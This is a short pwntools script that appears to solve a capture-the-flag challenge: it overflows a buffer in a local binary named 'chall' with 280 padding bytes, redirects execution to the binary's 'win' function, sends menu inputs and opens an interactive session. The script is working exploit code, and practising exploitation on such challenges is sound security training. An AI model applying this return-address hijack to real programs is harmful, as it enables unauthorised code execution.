from pwn import *
exe = context.binary = ELF("./chall")
r = process()
offset = 280
rop = ROP(exe)
rop.raw(b"\x00" * offset)
rop.raw(exe.sym['win'])
r.sendline(rop.chain())
r.sendline("2")
r.sendline("0")
r.sendline("1")
r.interactive()
